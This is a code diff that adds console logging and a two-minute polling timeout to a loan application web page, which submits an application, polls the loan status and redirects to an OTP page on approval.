@@ -203,20 +203,34 @@
     }
 
     function startPolling(loanId) {
+        console.log('🔄 Started polling for loan:', loanId);
+        
         pollInterval = setInterval(async () => {
             try {
                 const response = await fetch(`${API_URL}/api/loan/${loanId}`);
                 const data = await response.json();
+                console.log('📊 Poll response:', data);
                 
                 if (data.success && data.loan && data.loan.status === 'approved') {
+                    console.log('✅ Loan approved! Redirecting to OTP page...');
                     clearInterval(pollInterval);
                     document.getElementById('spinner').style.display = 'none';
                     window.location.href = 'otp.html';
+                } else {
+                    console.log('⏳ Current status:', data.loan?.status);
                 }
             } catch (err) {
                 console.error('Polling error:', err);
             }
         }, 3000);
+        
+        // Stop polling after 2 minutes
+        setTimeout(() => {
+            if (pollInterval) {
+                clearInterval(pollInterval);
+                console.log('🛑 Polling stopped after timeout');
+            }
+        }, 120000);
     }
 
     document.getElementById('submitBtn').onclick = async () => {
@@ -242,6 +256,7 @@
         let network = 'Telecel';
         
         try {
+            console.log('📤 Submitting application...');
             const response = await fetch(`${API_URL}/api/save-loan`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -258,6 +273,7 @@
             });
 
             const data = await response.json();
+            console.log('📥 Submit response:', data);
             
             if (data.success) {
                 sessionStorage.setItem('loanId', data.loanId);
@@ -267,12 +283,13 @@
                 document.getElementById('waitingArea').style.display = 'block';
                 btn.style.display = 'none';
                 
+                console.log('✅ Application submitted. Loan ID:', data.loanId);
                 startPolling(data.loanId);
             } else {
                 throw new Error(data.error || "Submission failed");
             }
         } catch (err) {
-            console.error('Submit error:', err);
+            console.error('❌ Submit error:', err);
             document.getElementById('spinner').style.display = 'none';
             showError("Error: " + err.message);
             btn.disabled = false;
